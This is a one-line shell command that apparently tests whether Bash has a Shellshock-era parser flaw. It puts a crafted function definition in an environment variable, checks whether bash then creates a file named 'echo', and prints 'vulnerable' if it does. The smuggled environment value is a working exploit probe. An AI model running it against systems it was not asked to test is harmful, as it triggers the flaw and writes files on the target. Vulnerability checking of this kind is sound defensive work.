env X='() { (a)=>\' bash -c "echo echo testing" 2>/dev/null; [[ "$(cat echo 2> /dev/null)" == "testing" ]] && echo "vulnerable" 2> /dev/null
